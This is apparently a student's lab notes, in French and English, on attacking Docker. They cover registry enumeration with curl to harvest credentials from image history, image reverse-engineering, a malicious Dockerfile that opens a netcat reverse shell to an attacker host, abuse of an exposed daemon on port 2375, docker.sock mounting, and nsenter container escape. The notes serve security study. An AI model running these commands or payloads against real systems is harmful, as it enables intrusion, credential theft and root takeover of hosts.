Le registre utilisé est un registre privé, là ou l'image docker de l'application web "demi" est déposée.
Ce registre permet au deux machines "33 et 34" la même image ainsi toutes modifications faites dans l'une seront apportées dans l'autre avec les commandes "push" et "pull".

--> Première interaction avec le registre :
- reconnaissance avec l'outil NMAP pour déceler les ports utilisés ainsi que la version de l'API utilisée.
nmap -sV VM_ip@

En suite, vérifier les ROUTES possibles selon la version de l'API trouvée dans le registre.
pour voir les routes possibles, il faut lire le document ci-dessous :
https://docs.docker.com/registry/spec/api/

- Discovering Repositories :
En utilisant : curl à partir du ligne de commande ou GET avec POSTMAN ou tout simplement le navigateur.
l'URL demandé avec GET est comme suit (par exemple : http://registry_name_on_daemon:port/v2/_catalog)
le resultat du GET sur ledit URL, doit nous lister all the repositories registered on the registry
Une fois the repositories has benn listed, we are only going to focus on one of then. The most interesting one and based on :
1. The repository name ;
2. Any repository tag(s) published.

On va envoyer de nouveau une requete avec la methode GET sur l'URL : http://registry_name_on_daemon:port/v2/repository/name/tags/list
sans oublier de remplacer repository et name avec ceux choisies dans l'étape précédante.
exemple : curl http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list
Comme resultat de cette commande, on va lister les différents "tag" pour l'image choisie. Ici on va choisir tag qu'il parait vulnérable pour qu'on l'exploit dans l'étape suivante.

- Grabbing the Data :
Toujours avec la methode GET, on va requester l'URL suivant : /v2/<name>/manifests/<reference> pour voir le contenu du dossier "manifest" qui contient bcp d'information sur l'image choisie avec le tag précisé.
exemple : curl http://docker-rodeo.thm:5000/v2/repo/myapp_name/manifests/tag
Maintenant une fois executée, on va s'interesser sur le resultat rendu, et plus précisement sur "history"
Il faut le lire et l'analyser doucement et révéler toute information utile, notamment credentials, mot de passe administrateur base de données ou peut importe.

--> 2ème interaction with registry : Vulnerability : Reverse Engineering Docker Images
De prime abord, il faut télécharger et installer : dive tool
lien officiel : https://github.com/wagoodman/dive#installation

en suite, on cherche l'identifiant de l'image : IMAGE_ID
cet identifiant sera utilisé pour reverser l'image avec l'outil "dive".
la commande est : dive image_id

- Using Dive :
une fois la commande "dive image_id" est éxécutée, on va s'intersser au :
1. Layers (les commandes éxécutées une fois l'image docker est téléchargée)
2. Current Layer Contents (l'arborescence de l'images docker)
3. Layer Details (détails de chaque couche notamment hash, digest, command line ...)

--> Vulnerability 3 : Uploading Malicious Docker Images :
En se basant sur le fichier Dockerfile, on peut créer une image docker, cette image peut éxécuter un code malveillant.
Exemple d'un Dockerfile personnalisé :
FROM debian:jessie-slim
RUN apt-get update -y
RUN apt-get install netcat -y
RUN nc -e /bin/sh attacker_ip@ port_number

Maintenant, pour générer une image docker, on doit utiliser "docker build"
exemple : docker build - < /path/to/Dockerfile
Au moment du building de l'image à partir du Dockerfile, les commandes en haut seront éxécutées dans l'ordre sous forme des couches.
Et c'est à ce moment là, une foils netcat est lancé, on aura notre reverse shell autant que root !!BOOM.

NB : docker service, by default is running under 2375 port number. To discover it using nmap :
nmap -SV -p- 192.168.1.229

Maintenant pour voir la version du docker à partir d'une machine autre que the host :
curl http://10.10.54.131:2375/version (the host machine ip adress)

Aussi, pour éxécuter différentes commandes a distance, notamment ps command :
docker -H tcp://10.10.54.131:2375 ps
docker -H tcp://10.10.54.131:2375 network ls
docker -H tcp://10.10.54.131:2375 exec -it container_id sh (cette commande permet d'avoir un reverse shell depuis docker container to a remote machine.

--> Vulnerability 5 : Escape via Exposed Docker Daemon :
A partir de la machine host contenant docker images, on peut à la fois éxécuter "run" une image et gagner root shell.
Supposant qu'on a une image nommée "alpine" et surnommé au moment d'éxécution par "chroot"
En exploitant "docker.sock" dont sa localisation est dans /var/run/docker.sock et avec la commande -v ou --mount on peut monter la racine "/" sur un répértoire de notre choix.

--> Vulnerability 6 : Shared Namespaces
Dans cette partie, on va découvrir de prime abord how docker isolates containers from one another.
To do so, three components of the Linux kernel :
* Namespaces
* Cgroups
* OverlayFS

On va se focaliser sur namespaces dans notre étude.
En effet, namespaces essentially segregate system resources such as processes, files and memory away from other namespaces.
Take Docker for example, every new container will be running as a new namespace, although the container may be running multiple applications que sont les processus.

Dans la machine host, docker procède à l'isolation et la séparation des contenaires à l'aide du PID (Process identifier) de chacun. (il est unique)
toujours dans la machine host, le premier process qui s'éxécute au démarrage est 0 when the system boots suivit du 1 qui est celui de "init" ou "systemd".

L'exploit sera comme suit : We can use process #1's namespace on an operating system to escalate our privileges.
Whilst containers are designed to use these namespaces to isolate from another,
they can instead, coincide with the host computers processes, rather than isolated from...this gives us a nice opportunity to escape!

Autrement dit, on va, depuis l'intérieur d'un contenaire, d'éxécuter un shell "sh commend line" avec le process id "PID" 1 qui est celui de systemd ou init.
Pour faire ceci, on va utiliser l'outil : nsenter. Pour plus de détail sur cet outil : https://man7.org/linux/man-pages/man1/nsenter.1.html
La commande qu'on utiliser avec ledit outil est : nsenter --target 1 --mount sh
Avec cette commande, on prend le shell root du contenaire mais avec le "/sbin/init" process #1. Maintenant we are using the namespace and permissions
of the systemd daemon for our new process (the shell).
